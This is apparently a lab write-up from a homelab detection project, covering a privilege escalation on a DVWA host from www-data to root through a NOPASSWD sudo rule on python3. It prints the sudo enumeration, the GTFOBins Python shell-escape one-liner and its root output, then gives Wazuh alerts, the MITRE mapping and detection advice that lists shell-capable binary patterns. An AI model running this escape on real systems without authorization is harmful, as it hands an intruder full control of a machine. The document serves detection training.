# Stage 07 — Privilege Escalation

> **Status:** Complete — evidence attached
> **Case:** [Case 01](../../04-Investigation/Cases/case-01-web-compromise.md)
> **Investigation:** [Phase 2 Deep Dive](../../04-Investigation/Deep-Dive-Attack-Chain-Investigation.md#phase-2-the-10-second-mistake-webshell-to-instant-root)
> **Evidence:** [attack](../../06-Resources/screenshots/attack-simulation/17.png) · [alert](../../06-Resources/screenshots/wazuh-deep-investigation/wzb-17-privesc-pam-sudo-python-root.jpg)

## Objective

Elevate our privileges from the low-level `www-data` service account to full `root` on DVWA by finding a misconfigured sudoers rule and escaping through Python.

## Commands

### 1. Privilege and Sudo Enumeration (www-data Shell)

Query the system to identify commands that the current user is authorized to execute via `sudo`:

```bash
# Enumerate permitted sudo commands for www-data
sudo -l
```

Observed sudo permissions output:
```text
Matching Defaults entries for www-data on dvwa:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User www-data may run the following commands on dvwa:
    (ALL) NOPASSWD: /usr/bin/python3
```

### 2. Exploitation via Python GTFOBins Vector

Exploit the `NOPASSWD` sudo permission on `/usr/bin/python3` to invoke the standard library `os` module and spawn an interactive `/bin/bash` shell running as root:

```bash
# Execute python3 under sudo to spawn a root bash shell
sudo /usr/bin/python3 -c 'import os; os.system("/bin/bash")'
```

### 3. Privilege Verification

Validate the newly acquired root context and security identifiers:

```bash
# Confirm root identity and group memberships
id
whoami
```

## What happened

1. **Checking sudo permissions:** As soon as I had an interactive shell, the first thing I checked was `sudo -l` to see what administrative permissions `www-data` had.
2. **Finding the golden misconfiguration:** The output was every attacker's dream: `(ALL) NOPASSWD: /usr/bin/python3`. Someone had configured the sudoers file so `www-data` could run Python 3 as root without even needing a password!
3. **Escaping through Python (GTFOBins):** Python can execute system commands directly. Using the classic GTFOBins escape trick, I ran: `sudo /usr/bin/python3 -c 'import os; os.system("/bin/bash")'`. Because Python was executed under sudo, the child `/bin/bash` process inherited effective UID 0.
4. **Instant root access:** The prompt immediately changed to `root@dvwa:~#`. Running `id` and `whoami` confirmed `uid=0(root) gid=0(root) groups=0(root)`. The machine was completely ours.
5. **Wrapping up Case 01:** This stage officially wraps up **Case 01 (Web Compromise)**. In just a few minutes, we went from scanning ports from the outside to full root control of the web server.

## Evidence

### Attack Screenshots

![Sudo Enumeration and Root Privilege Escalation](../../06-Resources/screenshots/attack-simulation/17.png)
*Figure 7.1 (Bottom Half): Execution of `sudo -l` revealing `(ALL) NOPASSWD: /usr/bin/python3`, followed by the Python GTFOBins command execution granting `root@dvwa`.*

### Alert Screenshots

![Wazuh Linux PAM Sudo Root Escalation Detection](../../06-Resources/screenshots/wazuh-deep-investigation/wzb-17-privesc-pam-sudo-python-root.jpg)
*Figure 7.2: Wazuh Linux PAM Rule 5402 telemetry capturing sudo root escalation by service user www-data executing /usr/bin/python3.*

![Wazuh Command Audit Telemetry for Sudo -l and Root Escape](../../06-Resources/screenshots/wazuh-deep-investigation/wzb-18-privesc-auditd-sudo-l.jpg)
*Figure 7.3: Wazuh Auditd Rule 100220 / command audit capturing sudo -l enumeration and interactive root shell escape on dvwa.*

## Alert observed

| Source | Rule / Signature | Rule ID | TheHive Alert | Severity | Status |
|---|---|---|---|---|---|
| Wazuh (Linux PAM) | PAM: Successful sudo root execution by service user (`www-data`) | Wazuh Rule 5402 (12x sudo alerts) | SIEM Indexed (`Wazuh-Raw-Alerts.csv` Data Rows 9145–9160, `wzb-17`) | High (3) | **Detected** |
| Wazuh (Host Command Audit) | Bash command by root: `sudo -l` and interactive root shell escape | Wazuh Rule 100220 (Level 5) | SIEM Indexed (`Wazuh-Raw-Alerts.csv` Data Row 9147, `wzb-18`) | Medium | **Detected (Forensic Command Capture)** |

## MITRE ATT&CK

| Tactic | Technique | ID | Sub-technique |
|---|---|---|---|
| Privilege Escalation | Abuse Elevation Control Mechanism | T1548 | Sudo and Sudo Caching (T1548.003) |

## Detection opportunities

- **Monitor Sudo on Service Accounts:** Service accounts like `www-data` should never run `sudo`. Any sudo execution from accounts with `uid < 1000` or `/usr/sbin/nologin` should fire an immediate high-priority alert.
- **GTFOBins Command Line Rules:** Watch for dangerous binaries run via `sudo` with inline execution flags (`python -c`, `find -exec`, `vim -c`, `awk 'BEGIN {system(...)}'`). Auditd and Wazuh can catch these commands in real time.
- **Process Lineage Detection:** Alert on trees where `sudo` spawns a scripting interpreter that spawns a shell: `sudo -> python3 -> /bin/bash`.
- **Lock Down Sudoers (The Real Fix):** Never give service accounts `NOPASSWD` sudo access to general-purpose programming languages or shell-capable binaries.

## Notes

- **Transitioning to Case 02:** With root access locked down, DVWA ceases to be just a victim—it becomes our forward operating base (pivot) to attack the internal Active Directory network (`192.168.56.0/24`).
